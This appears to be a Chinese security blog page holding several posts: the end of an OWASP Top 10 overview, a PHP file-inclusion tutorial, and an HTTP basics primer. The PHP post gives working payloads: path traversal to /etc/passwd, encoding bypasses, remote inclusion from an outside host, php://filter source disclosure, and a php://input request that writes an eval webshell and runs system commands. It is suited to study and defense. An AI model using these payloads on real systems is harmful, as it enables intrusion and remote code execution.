<h2 id="6-安全误配置（Security-Misconfiguration）"><a href="#6-安全误配置（Security-Misconfiguration）" class="headerlink" title="6.安全误配置（Security Misconfiguration）"></a><strong>6.安全误配置（Security Misconfiguration）</strong></h2><p>强大的安全性需要一个良好且安全的配置集，并为应用程序，框架，服务器，数据库和自定义代码进行部署，所有这些都应保持最新状态。否则，随之而来的缺陷可能会被攻击者利用，并使他们能够访问特权数据。需要定义，实施和调节应用程序整个环境的正确配置，否则可能会导致严重的安全漏洞。</p>
<p><strong>安全配置错误攻击原理</strong><br>攻击者能够通过未修复的漏洞、访问默认账户、不再使用的页面、未受保护的文件和目录、开放的不必要的端口等来取得对系统的未授权的访问，比如如果由于管理员的疏忽，/etc/passwd文件具有777的访问权限，这样攻击者就可以在拿到普通用户的身份后通过修改该文件拿到root权限。</p>
<p> <strong>防御安全配置错误的方法</strong><br>(1):使用的服务不包含任何不必要的功能、组件、文档和示例。移除或不安装不适用的功能和框架<br>(2):及时检测系统服务版本，为已发现的漏洞打补丁<br>(3):在对文件等分配权限时，根据其工作需要采取最小权限原则的方法</p>
<h2 id="7-跨站点脚本（XSS）"><a href="#7-跨站点脚本（XSS）" class="headerlink" title="7.跨站点脚本（XSS）"></a><strong>7.跨站点脚本（XSS）</strong></h2><p>跨站点脚本，通常称为XSS，是Web应用程序中经常发现的漏洞。XSS允许攻击者将客户端脚本注入到面向公众的网页中，并且在许多情况下，攻击者可以使用它们通过访问控制来进行工作。</p>
<p>XSS(Cross-Site Scripting，实际上应该是CSS，但是这与前端中的CSS重名，因此改名为XSS)简称为跨站脚本攻击，这是一种针对网站的应用程序的安全漏洞攻击技术，<strong>是代码注入的一种</strong>。它允许用户将恶意代码注入网页，其他用户在访问时就会收到影响。<strong>恶意用户利用XSS代码攻击成功后，可以进行重定向、获取cookie值等内容</strong>。</p>
<p><strong>XSS分为三类:反射型XSS、存储型XSS、DOM型XSS</strong><br><strong>(1):反射型XSS原理</strong><br>反射型XSS又称为非持久型XSS，这种攻击方式往往具有一次性。<br>攻击原理:攻击者向服务器一个带有恶意JS代码的请求，服务器会向攻击者返回一个带有JS脚本的页面，攻击者将带有恶意JS脚本的页面发送给目标用户，用户点击后就会触发XSS漏洞，从而被盗取cookie值或者被重定向到第三方网站。<br><strong>(2):存储型XSS</strong><br>存储型XSS又称为持久性XSS，<strong>攻击脚本将被永久地存放到目标服务器的数据库或者文件中</strong>，具有很高的隐蔽性。<br>攻击原理:攻击者向服务器一个带有恶意JS代码的请求，服务器会先在服务器上存储一份，然后<strong>会向攻击者返回一个带有JS脚本的页面</strong>。此时，<strong>当其他用户登录这个网站时，都会被盗取cookie值或者被重定向到第三方网站</strong>。<br><strong>(3):DOM型XSS</strong><br>DOM全称Document Object Model，DOM型XSS实际上是一种特殊类型的反射型XSS，它是一种基于DOM文档对象模型的一种漏洞<br>攻击原理:<strong>攻击者向服务器一个带有恶意JS代码的请求，服务器的响应不会以任何形式包含攻击者的脚本</strong>。<strong>当用户的浏览器处理这个响应时，DOM对象就会处理XSS代码，导致存在XSS漏洞</strong>。</p>
<p>4.防御XSS的方法<br>(1):<strong>对于截取cookie的XSS的防御可以在cookie上添加HttpOnly</strong><br>(2):过滤输入的数据，过滤”<br>(3):对动态输出到页面的内容进行html编码，使脚本无法在浏览器中执行</p>
<h2 id="8-不安全的反序列化（Insecure-Deserialization）"><a href="#8-不安全的反序列化（Insecure-Deserialization）" class="headerlink" title="8.不安全的反序列化（Insecure Deserialization）"></a><strong>8.不安全的反序列化（Insecure Deserialization）</strong></h2><p> 1.什么是序列化<br>有些时候我们<strong>需要把应用程序中的数据以另一种形式进行表达，以便于将数据存储起来</strong>，并在未来某个时间点再次使用，或者便于通过网络传输给接收方。这一过程我们把它叫做序列化。</p>
<p>2.什么是反序列化<br>反序列化和序列化是两个正好相反的过程。当我们要再次使用这些数据的时候，<strong>应用程序读取序列化之后的数据，并将其恢复成应用程序中的数据</strong>。</p>
<p>3.反序列化有什么安全问题<br>尽管反序列化<strong>最严重可导致远程代码执行</strong>(RCE，Remote Code Execution)，但最常见的反序列化安全问题却是<strong>通过修改序列化之后的数据字段，从而进行提权或越权</strong>操作。</p>
<p>4.反序列化攻击原理<br><strong>序列化即是把对象转变为字节流</strong>，存放在<strong>内存、文件数据库</strong>中，而<strong>反序列化</strong>即是把<strong>字节流转变为对象</strong>。在<strong>java中有一个ObjectOutputStream类的writeobject方法可以实现序列化</strong>，而<strong>ObjectInputStream类的Readobject</strong>方法可以实现反序列化。该漏洞的原因出自于<strong>如果应用对恶意构造的用户输入的数据进行反序列化，这样就会产生非预期的对象，从而有可能产生远程代码执行</strong>。或者应用中存在可以在<strong>反序列化过程中或者之后被改变行为的类</strong>，则攻击者可以通过<strong>改变应用逻辑或者实现远程代码执行攻击</strong>。我们将其称为<strong>对象和数据结构攻击</strong>。</p>
<p>5.防御反序列化的方法<br>(1):<strong>最安全的方法</strong>是<strong>不接受来自不受信源的序列化对象</strong>，或使用<strong>只允许原始数据类型的序列化媒体</strong><br>(2):反序列化之前，先进行严格的<strong>数据类型校验</strong>。由于校验规则容易被攻击者探索出来，进而容易被绕过，因此防御不能仅依赖这一个手段，但<strong>可以作为完整性校验防御方案的补充</strong><br>(3):<strong>隔离运行那些在低特权环境中反序列化的代码</strong><br>(4):对反序列化过程进行详尽的日志记录，<strong>监控反序列化过程，在发现疑似反序列化攻击时进行警报</strong></p>
<h2 id="9-使用具有已知漏洞的组件（Using-Components-with-Known-Vulnerabilities）"><a href="#9-使用具有已知漏洞的组件（Using-Components-with-Known-Vulnerabilities）" class="headerlink" title="9.使用具有已知漏洞的组件（Using Components with Known Vulnerabilities）"></a><strong>9.使用具有已知漏洞的组件（Using Components with Known Vulnerabilities）</strong></h2><p>组件（包括库和框架）可以从开源社区中获取，并且在潜伏漏洞的情况下应谨慎使用。当利用易受攻击的组件时，攻击者可以利用它并造成应用程序严重损坏，以及可能破坏应用程序甚至组织的大量数据丢失。</p>
<p> 1.攻击原理<br>由于现在的服务器都需要使用很多的组件，<strong>管理员并不能保证所使用的组件都是没有最新的，</strong>因此可能会存在一些版本是存在已知漏洞的(实际上比较新的版本的组件也是会存在漏洞的)，攻击者可以使用这些已知的漏洞来进行攻击，甚至获得管理员权限。</p>
<p>2.防御方法<br>(1):<strong>移除不使用的依赖、不需要的功能、组件、文件和文档</strong><br>(2):从官方渠道安全的获取组件，并<strong>使用签名机制来降低组件被篡改或加入恶意漏洞的风险</strong><br>(3):<strong>关注最新的漏洞报告，及时为需要的组件进行升级或者打补丁</strong></p>
<h2 id="10-日志记录和监视的不足（Insufficient-Logging-amp-Monitoring）"><a href="#10-日志记录和监视的不足（Insufficient-Logging-amp-Monitoring）" class="headerlink" title="10.日志记录和监视的不足（Insufficient Logging &amp; Monitoring）"></a><strong>10.日志记录和监视的不足（Insufficient Logging &amp; Monitoring）</strong></h2><p>根据OWASP的说法，日志记录和监视的不足，再加上事件响应的缺失或无效集成，使攻击者可以进一步攻击系统，保持持久性，转向更多系统以及篡改，提取或破坏数据。大多数违规研究表明，检测到违规的时间超过200天，通常由外部各方而不是内部流程或监视来检测。</p>
<p><strong>1.日志记录介绍</strong><br>日志记录是一个系统的最重要的功能之一。日志记录包括登录成功记录、登录失败记录、访问控制记录等，用来记录服务器的各种信息。</p>
<p><strong>2.攻击原理</strong><br>攻击者依靠监控的不足和响应的不及时来达成他们的目标而不被知晓。比如日志没有记录登录失败，那么攻击者可能就可以通过暴力破解多次进行登录尝试，但是日志中却没有记录。这就可能让攻击者成功入侵系统并隐匿自己的行踪。这个看似危害不大但却是十分严重的危害，因为一个日志系统不完善的服务器很容易遭受攻击并且在遭受攻击后无法判断攻击来源，这样就无法做出相应的防御，很可能再次遭受同样的攻击。</p>
<p><strong>3.防御方法</strong><br>(1):<strong>确保所有登录、访问控制失败、输入验证失败能够被记录到日志中去，并保留足够的用户上下文信息，以识别可疑或恶意帐户，并为后期取证预留足够时间</strong><br>(2):<strong>建立有效的监控和告警机制，使可疑活动在可接受的时间内被发现和应对</strong><br>(3):完善日志系统，使其可以监控各种日志信息<br>(4):及时对日志系统进行备份，并保存足够长时间</p>

      
      <!-- reward -->
      
    </div>
    
    
      <!-- copyright -->
      
    <footer class="article-footer">
      
      

    </footer>

  </div>

  

  
  
  

  

</article>
    
    <article id="post-PHP安全" class="article article-type-post" itemscope
  itemprop="blogPost" data-scroll-reveal>

  <div class="article-inner">
    
    <header class="article-header">
       
<h2 itemprop="name">
  <a class="article-title" href="/2020/07/11/PHP%E5%AE%89%E5%85%A8/"
    >PHP安全</a
  >
</h2>
  

    </header>
    

    
    <div class="article-meta">
      <a href="/2020/07/11/PHP%E5%AE%89%E5%85%A8/" class="article-date">
  <time datetime="2020-07-11T06:59:21.000Z" itemprop="datePublished">2020-07-11</time>
</a>
      
      
      
      
    </div>
    

    

    
    <div class="article-entry" itemprop="articleBody">
      


      

      
      <h2 id="1-文件包含漏洞"><a href="#1-文件包含漏洞" class="headerlink" title="1.文件包含漏洞"></a><strong>1.文件包含漏洞</strong></h2><h3 id="1-1-本地文件包含"><a href="#1-1-本地文件包含" class="headerlink" title="1.1 本地文件包含"></a><strong>1.1 本地文件包含</strong></h3><p><strong>../ 表示上一层目录，多../../../ 即可绕过前缀限制</strong></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/desktop/chj# cd /root/tools/../../etc</span><br><span class="line">root@kali:/etc#</span><br></pre></td></tr></table></figure>

<p><strong>PHP内核是由C语言实现的，所以0字节(\x00)将作为字符串结束，web输入时转为urlencode变成%00</strong></p>
<p><strong>即输入?file=../../etc/passwd%00 实际包含文件会变成/etc/passwd</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$file=$_GET[<span class="string">'file'</span>];</span><br><span class="line"><span class="keyword">if</span>(file_exists(<span class="string">'/home/run/'</span>.$file.<span class="string">'.php'</span>))</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">include</span> <span class="string">'/home/run'</span>.$file.<span class="string">'.php'</span>;</span><br><span class="line">&#125;	</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>但是通常情况下，网站管理员会禁止0字节，这时候可以利用其它技巧</strong></p>
<p><strong>原理：目录字符串在windows下256字节、linux下4096字节时会达到最大值，之后的字符将被丢弃</strong></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/etc/passwd/././././././././././././abc</span><br><span class="line">/etc/passwd//////////////////abc</span><br><span class="line">/etc/passwd.........................  #点号截断适用于Windows系统</span><br></pre></td></tr></table></figure>

<p><strong>可以通过不同的编码方式来绕过一些服务器端逻辑：</strong></p>
<table>
<thead>
<tr>
<th align="center"></th>
<th align="left"><strong>url编码</strong></th>
<th align="left"><strong>二次编码</strong></th>
<th align="left">web容器编码</th>
</tr>
</thead>
<tbody><tr>
<td align="center"><strong>../</strong></td>
<td align="left"><strong>%2e%2e%2f <br>..%2f <br>%2e%2e/</strong></td>
<td align="left"><strong>%252e%252e%252f</strong></td>
<td align="left"><strong>..%c0%af</strong></td>
</tr>
<tr>
<td align="center"><strong>..\</strong></td>
<td align="left"><strong>%2e%2e%5c<br> ..%5c <br>%2e%2e</strong></td>
<td align="left"><strong>%252e%252e%255c</strong></td>
<td align="left"><strong>..%c1%9c</strong></td>
</tr>
<tr>
<td align="center"></td>
<td align="left"></td>
<td align="left"></td>
<td align="left"></td>
</tr>
</tbody></table>
<p><strong>防护手段：配置open_basedir、避免包含动态变量，可以枚举出file的值</strong></p>
<p><strong>例如：open_basedir = /home/app/aaa  那么 /home/app/aaabbb 也是合法的</strong></p>
<p><strong>如果要限定目录，则设置为open_basedir = /home/app/aaa/ 即可</strong></p>
<p><strong>如果要配置多个目录的话在windows下用分号，linux下用冒号隔开</strong></p>
<h3 id="1-2-远程文件包含"><a href="#1-2-远程文件包含" class="headerlink" title="1.2 远程文件包含"></a><strong>1.2 远程文件包含</strong></h3><p><strong>漏洞利用条件：</strong></p>
<ul>
<li><strong>allow_url_fopen=On(默认为On) 规定是否允许从远程服务器或者网站检索数据</strong></li>
<li><strong>allow_url_include=On(php5.2之后默认为Off) 规定是否允许include/require远程文件</strong></li>
</ul>
<p><strong>测试代码：</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">     $filename  = $_GET[<span class="string">'filename'</span>];</span><br><span class="line">     <span class="keyword">include</span>($filename.”.html”);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="number">1.</span> 问号绕过</span><br><span class="line"></span><br><span class="line">http:<span class="comment">//127.0.0.1/test.php?filename=http://192.168.1.110/xiaohua.txt?</span></span><br><span class="line"></span><br><span class="line"><span class="number">2.</span> ＃号绕过</span><br><span class="line"></span><br><span class="line">http:<span class="comment">//127.0.0.1/test.php?filename=http://192.168.1.110/xiaohua.txt%23(#号要编码)</span></span><br><span class="line"></span><br><span class="line"><span class="number">3.</span> 空格绕过</span><br><span class="line"></span><br><span class="line">http:<span class="comment">//127.0.0.1/test.php?filename=http://192.168.1.110/xiaohua.txt%20(%20是空格的url编码)</span></span><br></pre></td></tr></table></figure>

<h3 id="1-3-本地文件包含的利用技巧"><a href="#1-3-本地文件包含的利用技巧" class="headerlink" title="1.3 本地文件包含的利用技巧"></a><strong>1.3 本地文件包含的利用技巧</strong></h3><p><strong>本地文件包含漏洞在某些条件下也可以执行PHP代码，以下是几种常见的技巧：</strong></p>
<p><strong>（1）包含用户上传的文件</strong></p>
<p><strong>如果用户上传的文件内容中包含了PHP代码，那么将被include（）加载后执行</strong></p>
<p><strong>（2）包含data://或php://input 等伪协议</strong></p>
<p><strong>（3）包含Session文件</strong></p>
<p><strong>（4）包含日志文件，如web server 的 access log</strong></p>
<p><strong>（5）包含上传的临时文件（RFC1867)</strong></p>
<p><strong>（6）包含/proc/self/environ 文件</strong></p>
<p><strong>（7）包含其它应用创建的文件，如数据库文件、缓存文件、应用日志等</strong></p>
<p><strong>下面着重分析下其中几种技巧的原理：</strong></p>
<p><strong>PHP伪协议：</strong></p>
<p><strong>PHP带了很多内置URL风格的封装协议，可用于fopen、copy、file_exists和filesize等文件系统函数。除了这些内置封装协议，还能通过stream_wrapper_register注册自定义的封装协议。这些协议都被称为伪协议。</strong></p>
<table>
<thead>
<tr>
<th align="center">php://   访问各个输入/输出流</th>
<th align="center"><strong>File:// ——访问本地文件系统</strong></th>
<th align="center"><strong>phar://  PHP归档</strong></th>
</tr>
</thead>
<tbody><tr>
<td align="center"><strong>data://  读取数据(RFC2397)</strong></td>
<td align="center"><strong>ftp:// ——访问FTP(s)URLs</strong></td>
<td align="center"><strong>zlib://   压缩流</strong></td>
</tr>
<tr>
<td align="center"><strong>glob://  查找匹配的文件路径模式</strong></td>
<td align="center"><strong>http:// ——访问HTTP(s)网址</strong></td>
<td align="center"><strong>expect:// 处理交互式的流</strong></td>
</tr>
</tbody></table>
<h4 id="php-filter伪协议"><a href="#php-filter伪协议" class="headerlink" title="php://filter伪协议"></a><strong>php://filter伪协议</strong></h4><p>php://filter 是元封装器，设计用于数据流打开时的筛选过滤应用,对本地磁盘文件进行读写。当它与包含函数结合时，php://filter流会被当作php文件执行。所以我们一般对其进行编码，让其不执行。从而导致任意文件读取</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#利用php:filter读本地磁盘文件时不需要开启allow_url_fopen和allow_url_include</span></span><br><span class="line">(<span class="number">1</span>):filename=php:<span class="comment">//filter/read=convert.base64-encode/resource=xx.php</span></span><br><span class="line">(<span class="number">2</span>):filename=php:<span class="comment">//filter/convert.base64-encode/resource=xxx.php</span></span><br><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">  $filename  = $_GET[<span class="string">'filename'</span>];</span><br><span class="line">  <span class="keyword">include</span>($filename);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">http:<span class="comment">//127.0.0.1/2.php?filename=php://filter/read=convert.base64-encode/resource=2.php</span></span><br><span class="line">得到<span class="number">2.</span>php的base64编码</span><br><span class="line">    PD9waHANCiRmaWxlbmFtZT0kX0dFVFsnZmlsZW5hbWUnXTsNCmluY2x1ZGUoJGZpbGVuYW1lKTsNCj8+</span><br></pre></td></tr></table></figure>

<h4 id="php-input伪协议"><a href="#php-input伪协议" class="headerlink" title="php://input伪协议"></a><strong>php://input伪协议</strong></h4><p><strong>php://input可以访问请求的原始数据的只读流，即可以直接读取POST上没有经过解析的原始数据，但是使用enctype=”multipart/form-data”的时候php://input是无效的</strong></p>
<p><strong>代码例子：</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#漏洞环境：需要开启allow_url_include=on</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$filename=$_GET[<span class="string">'filename'</span>];</span><br><span class="line"><span class="keyword">include</span>($filename);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">#写入木马payload如下：</span></span><br><span class="line">URL: http:<span class="comment">//192.168.1.110/test.php?filename=php://input</span></span><br><span class="line">POST:<span class="meta">&lt;?php</span> fputs(fopen(<span class="string">'shell.php'</span>,<span class="string">'w'</span>),<span class="string">'&lt;?php @eval($_POST[xiaohua])&gt;'</span>)<span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">#执行命令POST部分</span></span><br><span class="line"><span class="meta">&lt;?php</span> system(<span class="string">'whoami'</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>可以看到，成功在本地生成一个shell.php，并写入一句话木马</strong></p>
<p><strong><img src="/2020/07/11/PHP%E5%AE%89%E5%85%A8/1.png" alt></strong></p>
<h4 id="data-伪协议"><a href="#data-伪协议" class="headerlink" title="data://伪协议"></a><strong>data://伪协议</strong></h4><p>php5.2.0起，数据流封装器开始有效，主要用于数据流的读取。如果传入的数据是PHP代码，就会执行代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#漏洞环境</span></span><br><span class="line">allow_url_include=on</span><br><span class="line">allow_url_fopen=on </span><br><span class="line"><span class="comment">#data://text/plain;base64,xxxx(base64编码后的数据)</span></span><br><span class="line">http:<span class="comment">//127.0.0.1/2.php?filename=data://text/plain;base64,PD9waHAgc3lzdGVtKCJkaXIiKT8%2b</span></span><br><span class="line"><span class="meta">&lt;?php</span> system(<span class="string">"dir"</span>)<span class="meta">?&gt;</span>编码为PD9waHAgc3lzdGVtKCJkaXIiKT8+</span><br><span class="line">注意这里+需要url编码为%<span class="number">2</span>b才可以运行</span><br></pre></td></tr></table></figure>

<p>成功执行dir命令</p>
<p><img src="/2020/07/11/PHP%E5%AE%89%E5%85%A8/2.png" alt></p>

      
      <!-- reward -->
      
    </div>
    
    
      <!-- copyright -->
      
    <footer class="article-footer">
      
      

    </footer>

  </div>

  

  
  
  

  

</article>
    
    <article id="post-web基础-1" class="article article-type-post" itemscope
  itemprop="blogPost" data-scroll-reveal>

  <div class="article-inner">
    
    <header class="article-header">
       
<h2 itemprop="name">
  <a class="article-title" href="/2020/06/17/web%E5%9F%BA%E7%A1%80-1/"
    >web基础</a
  >
</h2>
  

    </header>
    

    
    <div class="article-meta">
      <a href="/2020/06/17/web%E5%9F%BA%E7%A1%80-1/" class="article-date">
  <time datetime="2020-06-17T03:05:06.000Z" itemprop="datePublished">2020-06-17</time>
</a>
      
      
      
      
    </div>
    

    

    
    <div class="article-entry" itemprop="articleBody">
      


      

      
      <h3 id="HTTP与HTTPS"><a href="#HTTP与HTTPS" class="headerlink" title="HTTP与HTTPS"></a>HTTP与HTTPS</h3><h4 id="1-HTTP的基本概念"><a href="#1-HTTP的基本概念" class="headerlink" title="1.HTTP的基本概念"></a><strong>1.HTTP的基本概念</strong></h4><p>HTTP：<a href="https://baike.baidu.com/item/超文本传输协议/8535513" target="_blank" rel="noopener">超文本传输协议</a>（HTTP，HyperText Transfer Protocol)是<a href="https://baike.baidu.com/item/互联网" target="_blank" rel="noopener">互联网</a>上应用最为广泛的一种<a href="https://baike.baidu.com/item/网络协议/328636" target="_blank" rel="noopener">网络协议</a>。设计Http最初的目的是为了提供一种发布和接收<a href="https://baike.baidu.com/item/HTML" target="_blank" rel="noopener">HTML</a>页面的方法。它可以使浏览器更加高效。Http协议是以明文方式发送信息的，如果黑客截取了Web浏览器和服务器之间的传输报文，就可以直接获得其中的信息。</p>
<p><strong>HTTP原理：</strong></p>
<p>①  客户端的浏览器首先要通过网络与服务器建立连接，该<strong>连接是通过TCP 来完成的，一般 TCP 连接的端口号是80</strong>。  建立连接后，客户机发送一个请求给服务器，请求方式的格式为：<strong>统一资源标识符（URL）、协议版本号，后边是 MIME  信息包括请求修饰符、客户机信息和许可内容。</strong></p>
<p>② 服务器接到请求后，给予相应的响应信息，其格式为一个状态行，包括信息的协议版本号、一个成功或错误的代码，后边是 MIME 信息包括服务器信息、实体信息和可能的内容。</p>
<h4 id="—-常见的HTTP相应状态码"><a href="#—-常见的HTTP相应状态码" class="headerlink" title="—-常见的HTTP相应状态码"></a><strong>—-常见的HTTP相应状态码</strong></h4><p>200：请求被正常处理<br>204：请求被受理但没有资源可以返回<br>206：客户端只是请求资源的一部分，服务器只对请求的部分资源执行GET方法，相应报文中通过Content-Range指定范围的资源。<br>301：永久性重定向<br>302：临时重定向<br>303：与302状态码有相似功能，只是它希望客户端在请求一个URI的时候，能通过GET方法重定向到另一个URI上<br>304：发送附带条件的请求时，条件不满足时返回，与重定向无关<br>307：临时重定向，与302类似，只是强制要求使用POST方法<br>400：请求报文语法有误，服务器无法识别<br>401：请求需要认证<br>403：请求的对应资源禁止被访问<br>404：服务器无法找到对应资源<br>500：服务器内部错误<br>503：服务器正忙</p>
<h4 id="—-GET方法与POST方法的区别"><a href="#—-GET方法与POST方法的区别" class="headerlink" title="—-GET方法与POST方法的区别"></a>—-GET方法与POST方法的区别</h4><p>区别一：<br>get重点在从服务器上获取资源，post重点在向服务器发送数据；<br>区别二：<br>get传输数据是通过URL请求，以field（字段）= value的形式，置于URL后，并用”?”连接，<strong>多个请求数据间用”&amp;”连接</strong>，如<a href="http://127.0.0.1/Test/login.action?name=admin&amp;password=admin，这个过程用户是可见的；" target="_blank" rel="noopener">http://127.0.0.1/Test/login.action?name=admin&amp;password=admin，这个过程用户是可见的；</a><br>post传输数据通过Http的post机制，将字段与对应值封存在请求实体中发送给服务器，这个过程对用户是不可见的；<br>区别三：<br>Get传输的数据量小，因为受URL长度限制，但效率较高；<br><strong>Post可以传输大量数据，所以上传文件时只能用Post方式</strong>；<br>区别四：<br>get是不安全的，因为URL是可见的，可能会泄露私密信息，如密码等；<br>post较get安全性较高；<br>区别五：<br>get方式只能支持ASCII字符，向服务器传的中文字符可能会乱码。<br><strong>post支持标准字符集，可以正确传递中文字符</strong>。</p>
<h4 id="—-HTTP请求报文与响应报文格式"><a href="#—-HTTP请求报文与响应报文格式" class="headerlink" title="—-HTTP请求报文与响应报文格式"></a><strong>—-HTTP请求报文与响应报文格式</strong></h4><p><strong>请求报文</strong>包含三部分：<br>a、请求行：包含<strong>请求方法、URI、HTTP版本信息</strong><br>b、请求首部字段<br>c、请求内容实体<br><strong>响应报文</strong>包含三部分：<br>a、状态行：<strong>包含HTTP版本、状态码、状态码的原因短语</strong><br>b、响应首部字段<br>c、响应内容实体</p>
<h4 id="—-常见HTTP首部字段"><a href="#—-常见HTTP首部字段" class="headerlink" title="—-常见HTTP首部字段"></a><strong>—-常见HTTP首部字段</strong></h4><p><strong>a、通用首部字段（请求报文与响应报文都会使用的首部字段）</strong><br>Date：创建报文时间<br>Connection：连接的管理<br>Cache-Control：缓存的控制<br>Transfer-Encoding：报文主体的传输编码方式</p>
<p><strong>b、请求首部字段（请求报文会使用的首部字段）</strong><br>Host：请求资源所在服务器<br>Accept：可处理的媒体类型<br>Accept-Charset：可接收的字符集<br>Accept-Encoding：可接受的内容编码<br>Accept-Language：可接受的自然语言</p>
<p><strong>c、响应首部字段（响应报文会使用的首部字段）</strong><br>Accept-Ranges：可接受的字节范围<br>Location：令客户端重新定向到的URI<br>Server：HTTP服务器的安装信息d、实体首部字段（请求报文与响应报文的的实体部分使用的首部字段）<br>Allow：资源可支持的HTTP方法<br>Content-Type：实体主类的类型<br>Content-Encoding：实体主体适用的编码方式<br>Content-Language：实体主体的自然语言<br>Content-Length：实体主体的的字节数<br>Content-Range：实体主体的位置范围，一般用于发出部分请求时使用</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/csl/</span> HTTP/1.1</span><br></pre></td></tr></table></figure>

<p><code>GET</code>表示一个读取请求，将从服务器获得网页数据<code>/cs1/</code>表示URL的路径，URL总是以<code>/</code>开头，<code>/</code>就表示首页，最后的<code>HTTP/1.1</code>指示采用的HTTP协议版本是1.1。目前HTTP协议的版本就是1.1，但是大部分服务器也支持1.0版本，主要区别在于1.1版本允许多个HTTP请求复用一个TCP连接，以加快传输速度。</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Host</span>: sports.sina.com.cn</span><br></pre></td></tr></table></figure>

<p>表示请求的域名是<code>sports.sina.com.cn</code>。如果一台服务器有多个网站，服务器就需要通过<code>Host</code>来区分浏览器请求的是哪个网站</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Content-Type</span>: text/html</span><br><span class="line"><span class="attribute">Content-Length</span>: 66125</span><br></pre></td></tr></table></figure>

<p><code>Content-Type</code>指示响应的内容，这里是<code>text/html</code>表示HTML网页。</p>
<p><strong>请注意，浏览器就是依靠<code>Content-Type</code>来判断响应的内容是网页还是图片，是视频还是音乐。</strong></p>
<p>浏览器并不靠URL来判断响应的内容，所以，即使URL是<code>http://example.com/abc.jpg</code>，它也不一定就是图片。</p>
<h4 id="—-常用的HTTP方法有哪些？"><a href="#—-常用的HTTP方法有哪些？" class="headerlink" title="—-常用的HTTP方法有哪些？"></a>—-常用的HTTP方法有哪些？</h4><p>GET： 用于请求访问已经被URI（统一资源标识符）识别的资源，可以通过URL传参给服务器<br>POST：用于传输信息给服务器，主要功能与GET方法类似，但一般推荐使用POST方式。<br>PUT： 传输文件，报文主体中包含文件内容，保存到对应URI位置。<br>HEAD： 获得报文首部，与GET方法类似，只是不返回报文主体，一般用于验证URI是否有效。<br>DELETE：删除文件，与PUT方法相反，删除对应URI位置的文件。<br>OPTIONS：查询相应URI支持的HTTP方法。</p>
<h4 id="—-HTTP请求过程"><a href="#—-HTTP请求过程" class="headerlink" title="—-HTTP请求过程"></a><strong>—-HTTP请求过程</strong></h4><p><strong>步骤1：浏览器首先向服务器发送HTTP请求，请求包括：</strong></p>
<p>方法：<code>GET</code>还是<code>POST</code>，<code>GET</code>仅请求资源，<code>POST</code>会附带用户数据；</p>
<p>路径：<code>/full/url/path</code>；</p>
<p>域名：由Host头指定：<code>Host: www.sina.com.cn</code></p>
<p>以及其他相关的Header；</p>
<p>如果是POST，那么请求还包括一个Body，包含用户数据。</p>
<p><strong>步骤2：服务器向浏览器返回HTTP响应，响应包括：</strong></p>
<p>响应代码：<code>200</code>表示成功，<code>3xx</code>表示重定向( <strong>表示要完成请求，需要进一步操作</strong>)，<code>4xx</code>表示客户端发送的请求有错误，<code>5xx</code>表示服务器端处理时发生了错误；</p>
<p>响应类型：由<code>Content-Type</code>指定，例如：<code>Content-Type: text/html;charset=utf-8</code>表示响应类型是HTML文本，并且编码是<code>UTF-8</code>，<code>Content-Type: image/jpeg</code>表示响应类型是JPEG格式的图片；</p>
<p>以及其他相关的Header；</p>
<p>通常服务器的HTTP响应会携带内容，也就是有一个Body，包含响应的内容，网页的HTML源码就在Body中。</p>
<p><strong>步骤3：如果浏览器还需要继续向服务器请求其他资源，比如图片，就再次发出HTTP请求，重复步骤1、2</strong></p>
